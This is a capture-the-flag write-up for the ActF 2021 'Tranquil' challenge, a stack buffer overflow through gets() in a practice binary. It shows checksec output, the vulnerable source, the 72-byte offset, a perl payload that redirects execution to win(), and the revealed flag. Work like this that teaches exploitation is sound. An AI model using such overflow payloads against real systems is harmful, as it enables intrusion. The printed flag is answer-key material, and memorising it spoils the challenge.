
# Tranquil

## Description

```
Finally, inner peace - Master Oogway

Source

Connect with nc shell.actf.co 21830, or find it on the shell server at /problems/2021/tranquil.

Author: JoshDaBosh
```

## Analysis

Looks like a simple buffer overflow.

```
team8838@actf:/problems/2021/tranquil$ checksec tranquil
[*] '/problems/2021/tranquil/tranquil'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

In `tranquil.c` you just have to overflow the `gets()` call in `vuln()`:

```c
int vuln(){
    char password[64];

    puts("Enter the secret word: ");

    gets(&password);


    if(strcmp(password, "password123") == 0){
        puts("Logged in! The flag is somewhere else though...");
    } else {
        puts("Login failed!");
    }

    return 0;
}
```

to overwrite the return address with the address of `win()`:

```c
int win(){
    char flag[128];

    FILE *file = fopen("flag.txt","r");

    if (!file) {
        printf("Missing flag.txt. Contact an admin if you see this on remote.");
        exit(1);
    }

    fgets(flag, 128, file);

    puts(flag);
}
```

```
team8838@actf:/problems/2021/tranquil$ objdump -d tranquil | grep '<win>'
0000000000401196 <win>:
```

`password` is 0x48 or 72 bytes away from the return pointer in `vuln()`, which we can verify with a couple of quick experiments:

```
team8838@actf:/problems/2021/tranquil$ perl -e 'print "A"x71' | ./tranquil 
Enter the secret word: 
Login failed!
team8838@actf:/problems/2021/tranquil$ perl -e 'print "A"x72' | ./tranquil 
Enter the secret word: 
Login failed!
Segmentation fault (core dumped)
```

Printing 72 A's plus a `\n` at the end puts the `\n` into the return address and causes a segfault.

## Solution

All we have to do now is write the address of `win()` at the end of the payload.

```
team8838@actf:/problems/2021/tranquil$ perl -e 'print "A"x72 . "\x96\x11\x40\x00"' | ./tranquil 
Enter the secret word: 
Login failed!
actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}

Segmentation fault (core dumped)
```

It still hit a segfault, but good enough to get the flag.

